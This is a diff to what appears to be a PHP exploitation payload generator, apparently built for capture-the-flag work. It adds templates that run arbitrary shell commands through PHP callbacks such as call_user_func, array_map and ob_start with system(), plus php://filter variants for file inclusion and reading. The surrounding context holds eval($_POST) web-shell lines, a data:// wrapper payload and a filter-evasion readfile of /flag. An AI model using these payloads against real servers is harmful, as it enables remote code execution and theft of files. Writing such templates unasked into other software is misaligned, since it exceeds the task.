@@ -1,4 +1,4 @@
-﻿READFILE_TEMPLATES = [
+READFILE_TEMPLATES = [
     "cat {path}",
     "tac {path}",
     "nl {path}",
@@ -381,6 +381,15 @@ AUTO_HTMLSPECIALCHARS_SAFE = [
     "readfile(chr(47).chr(102).chr(108).chr(97).chr(103));",
 ]
 
+AUTO_CALLBACK_EXEC_TEMPLATES = [
+    "call_user_func('system','{cmd}');",
+    "array_map('system',array('{cmd}'));",
+    "ob_start('system');echo '{cmd}';ob_end_flush();",
+    "register_shutdown_function('system','{cmd}');",
+    "$__f=ReflectionFunction('system');$__f('{cmd}');",
+    "$__f=Closure::fromCallable('system');$__f('{cmd}');",
+]
+
 AUTO_PRECISE_EVAL_TEMPLATES = [
     "eval($_POST['{key}']);",
     "eval($_GET['{key}']);",
@@ -390,6 +399,8 @@ AUTO_PRECISE_EVAL_TEMPLATES = [
 ]
 
 AUTO_PRECISE_INCLUDE_TEMPLATES = [
+    "{path}",
+    "php://filter/resource={path}",
     "php://filter/read=convert.base64-encode/resource={path}",
     "php://filter/convert.iconv.utf-8.utf-16le/resource={path}",
     "data://text/plain,<?php system('cat {path}');?>",
@@ -401,6 +412,7 @@ AUTO_PRECISE_INCLUDE_TEMPLATES = [
 
 AUTO_FILE_READ_PATH_TEMPLATES = [
     "{path}",
+    "php://filter/resource={path}",
     "php://filter/read=convert.base64-encode/resource={path}",
     "php://filter/convert.iconv.utf-8.utf-16le/resource={path}",
 ]
